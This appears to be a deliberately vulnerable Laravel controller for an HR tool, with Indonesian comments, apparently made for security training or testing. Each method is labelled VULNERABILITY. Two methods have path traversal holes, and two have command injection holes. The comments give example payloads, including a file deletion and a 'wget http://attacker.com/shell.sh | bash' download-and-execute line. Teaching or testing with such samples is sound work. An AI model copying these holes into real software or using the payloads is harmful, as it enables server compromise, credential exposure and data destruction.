<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;

class ToolsHRController extends Controller
{
    // VULNERABILITY: Path Traversal — unduh dokumen karyawan
    public function unduhDokumen(Request $request)
    {
        $dokumen = $request->input('dokumen'); // "kontrak_kerja_001.pdf"
        // Penyerang: dokumen=../../config/database.php
        $path = storage_path('dokumen/' . $dokumen);
        return response()->download($path);
    }

    // VULNERABILITY: Path Traversal — baca template surat
    public function previewTemplate(Request $request)
    {
        $template = $request->input('template');
        $konten   = file_get_contents(resource_path('templates/' . $template));
        return response($konten)->header('Content-Type', 'text/plain');
    }

    // VULNERABILITY: Command Injection — kirim email massal payslip
    public function kirimPayslip(Request $request)
    {
        $bulan  = $request->input('bulan');   // "2024-01; rm -rf /tmp/hr/*"
        $dept   = $request->input('dept');
        $result = shell_exec("php artisan hr:send-payslip --bulan=$bulan --dept=$dept");
        return response()->json(['log' => $result]);
    }

    // VULNERABILITY: Command Injection — generate laporan PDF
    public function cetakLaporan(Request $request)
    {
        $format = $request->input('format'); // "pdf; wget http://attacker.com/shell.sh | bash"
        $range  = $request->input('range');
        exec("python3 /opt/hr-tools/report_gen.py --format=$format --range=$range", $out);
        return response()->json(['output' => $out]);
    }
}
